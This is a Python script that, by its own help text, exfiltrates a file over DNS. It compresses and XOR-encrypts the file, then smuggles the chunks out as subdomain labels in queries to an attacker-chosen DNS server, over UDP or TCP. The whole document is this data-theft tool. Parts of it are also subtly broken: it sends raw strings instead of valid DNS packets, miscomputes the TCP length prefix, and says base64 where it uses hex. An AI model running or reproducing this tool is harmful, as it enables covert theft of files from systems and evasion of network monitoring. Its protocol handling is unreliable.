import argparse
import base64
import os
import gzip
import socket
import struct
from datetime import datetime

def xor_encrypt(data, password):
    return bytes([data[i] ^ password[i % len(password)] for i in range(len(data))])

def send_dns_query(dns_server_ip, subdomain, use_tcp=False):
    query = subdomain + "."
    server_address = (dns_server_ip, 53)
    
    if use_tcp:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(server_address)
        query_length = len(query) + 2
        sock.sendall(struct.pack('!H', query_length) + query.encode())
        sock.close()
    else:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(query.encode(), server_address)
        sock.close()

def main(file_path, domain, dns_server_ip, password, use_tcp):
    if not os.path.isfile(file_path):
        print(f"File not found: {file_path}")
        return

    with open(file_path, "rb") as file:
        data = file.read()

    filename = os.path.basename(file_path)
    timestamp = datetime.now().strftime("%Y%m%d%H%M%S")

    compressed_data = gzip.compress(data)
    encrypted_data = xor_encrypt(compressed_data, password.encode())
    hex_encrypted_data = encrypted_data.hex()

    label_max_size = 63
    request_max_size = 255

    domain_name_length = len(domain) + 3
    metadata_length = (len(filename) + len(timestamp) + 6) * 2
    bytes_left = request_max_size - metadata_length - domain_name_length
    nb_chunks = (len(hex_encrypted_data) + bytes_left - 1) // bytes_left

    print(f"[+] Maximum data exfiltrated per DNS request (chunk max size): [{bytes_left}] bytes")
    print(f"[+] Number of chunks: [{nb_chunks}]")

    chunk_id = 0
    start_index = 0

    while chunk_id < nb_chunks:
        end_index = min(start_index + bytes_left, len(hex_encrypted_data))
        chunk = hex_encrypted_data[start_index:end_index]

        chunk_length = (len(chunk) + 3) // 4
        chunks = [chunk[i * chunk_length:(i + 1) * chunk_length] for i in range(4)]

        encrypted_filename = xor_encrypt(filename.encode(), password.encode())
        hex_filename = encrypted_filename.hex()
        metadata = f"{hex_filename}|{timestamp}|{nb_chunks}"
        subdomain = f"{chunk_id}.{chunks[0]}.{chunks[1]}.{chunks[2]}.{chunks[3]}.{metadata}.{domain}"

        send_dns_query(dns_server_ip, subdomain, use_tcp)

        chunk_id += 1
        start_index = end_index

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Exfiltrate a file over DNS by sending XOR-encrypted, base64 encoded chunks as DNS queries.")
    parser.add_argument("-f", "--file_path", required=True, help="Path to the file you want to exfiltrate.")
    parser.add_argument("-d", "--domain", required=True, help="Domain to use in DNS queries.")
    parser.add_argument("-s", "--dns_server_ip", required=True, help="IP address of the DNS server.")
    parser.add_argument("-p", "--password", required=True, help="Password to be used in XOR encryption.")
    parser.add_argument("-t", "--use_tcp", action="store_true", help="Use TCP instead of UDP for DNS queries.")

    args = parser.parse_args()
    main(args.file_path, args.domain, args.dns_server_ip, args.password, args.use_tcp)
